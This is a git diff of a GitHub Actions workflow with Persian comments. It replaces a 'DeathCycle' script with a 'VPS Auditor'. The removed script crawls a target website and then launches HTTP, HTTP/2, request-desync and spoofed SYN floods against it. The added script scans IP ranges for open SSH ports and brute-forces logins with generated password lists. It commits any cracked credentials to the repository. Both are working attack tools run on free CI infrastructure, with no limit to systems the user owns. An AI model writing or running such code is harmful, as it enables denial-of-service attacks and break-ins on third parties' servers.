@@ -1,299 +1,215 @@
-name: DeathCycle - Recon → Attack
+name: VPS Auditor - with IP Discovery
 
 on:
   workflow_dispatch:
     inputs:
-      target:
-        description: 'آدرس هدف (https://example.com)'
+      scan_range:
+        description: 'رنج CIDR برای اسکن خودکار (مثلاً 192.168.1.0/24). خالی بذار برای استفاده از لیست دستی'
+        required: false
+      targets:
+        description: 'IPهای هدف (در صورت پر نبودن scan_range)'
+        required: false
+      mode:
+        description: 'منبع لیست اعتبارنامه'
         required: true
-      attack_power:
-        description: 'قدرت حمله'
-        required: true
-        default: 'medium'
+        default: 'auto'
         type: choice
         options:
-          - light
-          - medium
-          - heavy
-          - insane
+          - auto
+          - manual
+      keywords:
+        description: 'کلمات کلیدی (برای حالت auto)'
+        required: false
+      usernames:
+        description: 'یوزرنیم‌های دستی (برای حالت manual)'
+        required: false
+      passwords:
+        description: 'پسوردهای دستی (برای حالت manual)'
+        required: false
+      port:
+        description: 'پورت SSH'
+        required: true
+        default: '22'
+      timeout:
+        description: 'زمان انتظار (ثانیه)'
+        required: true
+        default: '5'
 
 permissions:
   contents: write
 
 jobs:
-  deathcycle:
+  audit:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
-      - name: 🔧 نصب تمام ابزارها
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y nmap python3-pip
-          pip3 install requests beautifulsoup4 rich aiohttp httpx[http2] websockets scapy python-nmap
+      - name: نصب پیش‌نیاز
+        run: pip3 install paramiko rich
 
-      - name: 🕷️ فاز ۱: Recon (شناسایی سطح حمله)
+      - name: اجرای IP Scanner + VPS Auditor
         env:
-          TARGET_URL: ${{ github.event.inputs.target }}
+          SCAN_RANGE: ${{ github.event.inputs.scan_range }}
+          TARGETS_INPUT: ${{ github.event.inputs.targets }}
+          MODE: ${{ github.event.inputs.mode }}
+          KEYWORDS: ${{ github.event.inputs.keywords }}
+          USERNAMES_INPUT: ${{ github.event.inputs.usernames }}
+          PASSWORDS_INPUT: ${{ github.event.inputs.passwords }}
+          PORT: ${{ github.event.inputs.port }}
+          TIMEOUT: ${{ github.event.inputs.timeout }}
         run: |
           python3 << 'PYEOF'
-          import os, json, re, time
+          import os, sys, socket, time, random, string, ipaddress, concurrent.futures
           from datetime import datetime
-          from urllib.parse import urljoin, urlparse
-          from collections import deque
-          from rich.console import Console
-          import requests
-          from bs4 import BeautifulSoup
-
-          console = Console()
-          TARGET = os.environ["TARGET_URL"].rstrip('/')
-          MAX_DEPTH = 2
-          visited = set()
-          queue = deque()
-          queue.append((TARGET, 0))
-          all_forms = []
-          all_apis = []
-          all_urls = []
-          session = requests.Session()
-          session.headers.update({"User-Agent": "DeathCycle/1.0"})
-
-          console.print("[bold yellow]🕷️ فاز ۱: ReconCrawler[/bold yellow]")
-
-          while queue:
-              url, depth = queue.popleft()
-              if url in visited or depth > MAX_DEPTH:
-                  continue
-              visited.add(url)
-              all_urls.append(url)
-              try:
-                  resp = session.get(url, timeout=8)
-                  soup = BeautifulSoup(resp.text, 'html.parser')
-
-                  # فرم‌ها
-                  for form in soup.find_all('form'):
-                      action = form.get('action', '')
-                      method = form.get('method', 'GET').upper()
-                      form_url = urljoin(url, action) if action else url
-                      inputs = []
-                      for inp in form.find_all(['input', 'textarea', 'select']):
-                          name = inp.get('name', '') or inp.get('id', '')
-                          if name:
-                              inputs.append(name)
-                      if inputs:
-                          all_forms.append({"url": form_url, "method": method, "params": inputs})
-
-                  # APIها در اسکریپت‌ها
-                  for script in soup.find_all('script'):
-                      if script.string:
-                          matches = re.findall(r'["\']((?:https?:)?//[^"\']+(?:api|graphql|rest|v\d)[^"\']*)["\']', script.string, re.IGNORECASE)
-                          for m in matches:
-                              all_apis.append(m)
-
-                  # لینک‌های داخلی
-                  for a in soup.find_all('a', href=True):
-                      href = a['href'].strip()
-                      if href and not href.startswith(('#', 'javascript:', 'mailto:')):
-                          full = urljoin(url, href).split('#')[0]
-                          if urlparse(full).netloc == urlparse(TARGET).netloc:
-                              queue.append((full, depth + 1))
-              except:
-                  pass
-
-          # ذخیره سطح حمله
-          attack_surface = {
-              "target": TARGET,
-              "urls": all_urls,
-              "forms": all_forms,
-              "api_endpoints": all_apis
-          }
-          with open("attack_surface.json", "w") as f:
-              json.dump(attack_surface, f, indent=2)
-
-          console.print(f"[green]✓ URLs: {len(all_urls)} | Forms: {len(all_forms)} | APIs: {len(all_apis)}[/green]")
-          PYEOF
-
-      - name: ⚡ فاز ۲: حمله بر اساس یافته‌ها
-        env:
-          ATTACK_POWER: ${{ github.event.inputs.attack_power }}
-        run: |
-          python3 << 'PYEOF'
-          import os, sys, time, json, random, threading, asyncio, aiohttp, socket
           from rich.console import Console
           from rich.table import Table
-          from rich.live import Live
           from rich.panel import Panel
+          import paramiko
 
           console = Console()
-          POWER = os.environ["ATTACK_POWER"]
-          POWER_MAP = {"light": 100, "medium": 300, "heavy": 500, "insane": 1000}
-          THREADS = POWER_MAP.get(POWER, 300)
+          console.print(Panel.fit("[bold yellow]🗝️ VPS Auditor with IP Discovery[/bold yellow]", border_style="yellow"))
 
-          with open("attack_surface.json") as f:
-              surface = json.load(f)
+          # ========== ۱. IP Scanner ==========
+          scan_range = os.environ.get("SCAN_RANGE", "").strip()
+          discovered_ips = []
 
-          TARGET = surface["target"]
-          forms = surface["forms"]
-          apis = surface["api_endpoints"]
-          urls = surface["urls"]
+          if scan_range:
+              console.print(f"🔍 اسکن رنج {scan_range} برای پورت ۲۲...")
+              try:
+                  network = ipaddress.IPv4Network(scan_range, strict=False)
+                  ips = [str(ip) for ip in network.hosts()]
+              except:
+                  console.print("[red]❌ رنج CIDR نامعتبر[/red]")
+                  sys.exit(1)
 
-          stats = {'sent': 0, 'success': 0, 'failed': 0, 'lock': threading.Lock()}
-          stop_event = threading.Event()
-
-          def increment(key):
-              with stats['lock']:
-                  stats[key] += 1
-
-          def get_stats():
-              with stats['lock']:
-                  return dict(stats)
-
-          USER_AGENTS = [
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-          ]
-
-          async def http_worker(url, method="GET", data=None):
-              connector = aiohttp.TCPConnector(limit=0, force_close=False)
-              async with aiohttp.ClientSession(connector=connector) as session:
-                  while not stop_event.is_set():
-                      headers = {"User-Agent": random.choice(USER_AGENTS)}
-                      try:
-                          if method == "POST":
-                              async with session.post(url, headers=headers, data=data, timeout=5) as r:
-                                  increment('sent')
-                                  if r.status < 500: increment('success')
-                                  else: increment('failed')
-                          else:
-                              async with session.get(url, headers=headers, timeout=5) as r:
-                                  increment('sent')
-                                  if r.status < 500: increment('success')
-                                  else: increment('failed')
-                      except:
-                          increment('sent')
-                          increment('failed')
-                      await asyncio.sleep(0.0001)
-
-          async def http2_worker(url):
-              import httpx
-              async with httpx.AsyncClient(http2=True, verify=False, timeout=5.0) as client:
-                  while not stop_event.is_set():
-                      headers = {"User-Agent": random.choice(USER_AGENTS)}
-                      try:
-                          r = await client.get(url, headers=headers)
-                          increment('sent')
-                          if r.status_code < 500: increment('success')
-                          else: increment('failed')
-                      except:
-                          increment('sent')
-                          increment('failed')
-                      await asyncio.sleep(0.0001)
-
-          async def desync_worker(url):
-              parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
-              host = parsed.split(':')[0]
-              port = 443 if 'https' in url else 80
-              while not stop_event.is_set():
+              def check_ip(ip):
                   try:
                       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                      sock.settimeout(4)
-                      sock.connect((host, port))
-                      sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n".encode())
+                      sock.settimeout(0.5)
+                      result = sock.connect_ex((ip, 22))
                       sock.close()
-                      increment('sent')
-                      increment('success')
+                      return ip if result == 0 else None
                   except:
-                      increment('sent')
-                      increment('failed')
-                  await asyncio.sleep(0.0001)
+                      return None
 
-          def syn_worker(ip, port):
-              from scapy.all import IP, TCP, send
-              while not stop_event.is_set():
-                  src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
-                  pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
-                  send(pkt, verbose=False)
-                  increment('sent')
-                  increment('success')
+              console.print(f"⏳ اسکن {len(ips)} آی‌پی...")
+              with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
+                  future_to_ip = {executor.submit(check_ip, ip): ip for ip in ips}
+                  for future in concurrent.futures.as_completed(future_to_ip):
+                      ip = future.result()
+                      if ip:
+                          discovered_ips.append(ip)
+                          console.print(f"[green]✓ {ip} باز[/green]")
 
-          def run_async(worker_func, *args, workers=10):
-              loop = asyncio.new_event_loop()
-              asyncio.set_event_loop(loop)
-              tasks = [worker_func(*args) for _ in range(workers)]
-              loop.run_until_complete(asyncio.gather(*tasks))
+              console.print(f"\n[green]✅ {len(discovered_ips)} آی‌پی با پورت ۲۲ باز پیدا شد[/green]")
 
-          console.print(Panel.fit("[bold yellow]⚡ فاز ۲: حمله هدفمند بر اساس یافته‌ها[/bold yellow]", border_style="yellow"))
+              # ذخیره توی فایل
+              with open("discovered_ips.txt", "w") as f:
+                  for ip in discovered_ips:
+                      f.write(ip + "\n")
+              os.system("git add discovered_ips.txt && git commit -m 'Add discovered IPs' && git push 2>/dev/null || true")
 
-          attack_threads = []
+              targets = discovered_ips if discovered_ips else []
+          else:
+              # استفاده از لیست دستی
+              targets_input = os.environ.get("TARGETS_INPUT", "").strip()
+              if os.path.exists(targets_input):
+                  with open(targets_input) as f:
+                      targets = [line.strip() for line in f if line.strip()]
+              else:
+                  targets = [x.strip() for x in targets_input.split(',') if x.strip()]
 
-          # ۱. حمله به فرم‌های POST
-          for form in forms:
-              if form['method'] == 'POST':
-                  console.print(f"[cyan]→ HTTP POST Flood: {form['url']}[/cyan]")
-                  payload = {p: ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=50)) for p in form['params']}
-                  for _ in range(THREADS // 10):
-                      t = threading.Thread(target=run_async, args=(http_worker, form['url'], "POST", payload))
-                      t.daemon = True
-                      t.start()
-                      attack_threads.append(t)
+          if not targets:
+              console.print("[red]❌ هیچ آی‌پی هدفی پیدا نشد[/red]")
+              sys.exit(1)
 
-          # ۲. حمله HTTP/2 به APIها
-          for api in apis[:5]:
-              if api.startswith('http'):
-                  console.print(f"[cyan]→ HTTP/2 Flood: {api}[/cyan]")
-                  for _ in range(THREADS // 10):
-                      t = threading.Thread(target=run_async, args=(http2_worker, api))
-                      t.daemon = True
-                      t.start()
-                      attack_threads.append(t)
+          console.print(f"🎯 تعداد هدف‌ها: {len(targets)}")
 
-          # ۳. Desync روی خود دامنه
-          if urls:
-              console.print(f"[cyan]→ Desync Attack: {TARGET}[/cyan]")
-              for _ in range(THREADS // 5):
-                  t = threading.Thread(target=run_async, args=(desync_worker, TARGET))
-                  t.daemon = True
-                  t.start()
-                  attack_threads.append(t)
+          # ========== ۲. ListForge ==========
+          mode = os.environ["MODE"]
+          port = int(os.environ["PORT"])
+          timeout = int(os.environ["TIMEOUT"])
 
-          # ۴. SYN Flood روی پورت‌های باز
-          try:
-              ip = socket.gethostbyname(urlparse(TARGET).netloc)
-              console.print(f"[cyan]→ SYN Flood: {ip}:443[/cyan]")
-              for _ in range(THREADS // 10):
-                  t = threading.Thread(target=syn_worker, args=(ip, 443))
-                  t.daemon = True
-                  t.start()
-                  attack_threads.append(t)
-          except:
-              pass
+          def generate_usernames(keywords):
+              base = ["root", "admin", "user", "test", "guest", "ubuntu", "debian", "centos"]
+              for kw in keywords:
+                  base.append(kw.lower())
+                  base.append(kw.capitalize())
+              return list(set(base))
 
-          # ۵. HTTP Flood روی تمام URLهای کشف‌شده
-          for url in urls[:20]:
-              console.print(f"[dim]→ HTTP Flood: {url}[/dim]")
-              for _ in range(THREADS // 20):
-                  t = threading.Thread(target=run_async, args=(http_worker, url, "GET"))
-                  t.daemon = True
-                  t.start()
-                  attack_threads.append(t)
+          def generate_passwords(keywords):
+              base = ["123456", "password", "admin", "root", "12345678", "qwerty", "1q2w3e4r"]
+              years = ["2024", "2025", "2026", "2023"]
+              specials = ["!", "@", "#", "$", ""]
+              for kw in keywords:
+                  kw_lower = kw.lower()
+                  kw_cap = kw.capitalize()
+                  for yr in years:
+                      for sp in specials:
+                          base.append(f"{kw_cap}{yr}{sp}")
+                          base.append(f"{kw_lower}{yr}{sp}")
+                          base.append(f"{kw_lower}@{yr}")
+                  base.append(kw_lower)
+                  base.append(kw_cap)
+              return list(set(base))
 
-          console.print(f"\n[bold green]🚀 {len(attack_threads)} نخ حمله فعال شد[/bold green]")
-          console.print("[yellow]حمله به مدت ۱۲۰ ثانیه ادامه خواهد داشت...[/yellow]")
+          if mode == "manual":
+              usernames_input = os.environ.get("USERNAMES_INPUT", "").strip()
+              passwords_input = os.environ.get("PASSWORDS_INPUT", "").strip()
+              usernames = [x.strip() for x in usernames_input.split(',') if x.strip()] if usernames_input else ["root"]
+              passwords = [x.strip() for x in passwords_input.split(',') if x.strip()] if passwords_input else ["123456"]
+          else:
+              keywords_input = os.environ.get("KEYWORDS", "").strip()
+              if not keywords_input:
+                  keywords_input = "admin,web,server"
+              keywords = [k.strip() for k in keywords_input.split(',') if k.strip()]
+              usernames = generate_usernames(keywords)
+              passwords = generate_passwords(keywords)
+              console.print(f"[green]📝 ListForge: {len(usernames)} یوزرنیم، {len(passwords)} پسورد[/green]")
 
-          time.sleep(120)
-          stop_event.set()
-          time.sleep(1)
+          # ========== ۳. تست SSH ==========
+          results = []
+          total = len(targets) * len(usernames) * len(passwords)
+          attempt = 0
+          for target in targets:
+              for username in usernames:
+                  for password in passwords:
+                      attempt += 1
+                      console.print(f"[dim]{attempt}/{total} {target} {username}:{password}[/dim]", end="\r")
+                      try:
+                          client = paramiko.SSHClient()
+                          client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                          client.connect(hostname=target, port=port, username=username, password=password,
+                                         timeout=timeout, allow_agent=False, look_for_keys=False)
+                          console.print(f"\n[green]✅ موفق: {target} {username}:{password}[/green]")
+                          results.append({"target":target,"username":username,"password":password,"status":"SUCCESS"})
+                          client.close()
+                      except paramiko.AuthenticationException:
+                          results.append({"target":target,"username":username,"password":password,"status":"FAILED"})
+                      except Exception as e:
+                          console.print(f"\n[yellow]⚠️ خطا در {target}: {e}[/yellow]")
+                          break
 
-          final = get_stats()
-          console.print("\n[bold green]✅ حمله پایان یافت[/bold green]")
+          # ========== ۴. گزارش ==========
+          successes = [r for r in results if r["status"] == "SUCCESS"]
+          if successes:
+              tbl = Table(title="✅ Successful", show_header=True, header_style="bold white")
+              tbl.add_column("IP", style="cyan"); tbl.add_column("User", style="green"); tbl.add_column("Pass", style="yellow")
+              for r in successes:
+                  tbl.add_row(r["target"], r["username"], r["password"])
+              console.print(tbl)
+          else:
+              console.print("[red]❌ هیچ اعتبارنامه موفقی پیدا نشد.[/red]")
 
-          tbl = Table(title="📊 نتیجه نهایی", show_header=True, header_style="bold white")
-          tbl.add_column("متریک", style="cyan")
-          tbl.add_column("مقدار", style="bold white")
-          tbl.add_row("کل ارسالی", f"{final['sent']:,}")
-          tbl.add_row("موفق", f"[green]{final['success']:,}[/green]")
-          tbl.add_row("ناموفق", f"[red]{final['failed']:,}[/red]")
-          success_rate = (final['success'] / (final['sent'] or 1)) * 100
-          tbl.add_row("نرخ موفقیت", f"[yellow]{success_rate:.1f}%[/yellow]")
-          console.print(tbl)
+          report = "vps_audit_report.txt"
+          with open(report, "w") as f:
+              f.write(f"VPS Auditor Report\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+              for r in results:
+                  f.write(f"{r['target']} {r['username']}:{r['password']} -> {r['status']}\n")
+              if successes:
+                  f.write("\n--- Successes ---\n")
+                  for r in successes:
+                      f.write(f"{r['target']}: {r['username']} / {r['password']}\n")
+          os.system(f"git add {report} && git commit -m 'VPS audit' && git push 2>/dev/null || true")
+          console.print(f"\n[green]📄 گزارش: {report}[/green]")
           PYEOF
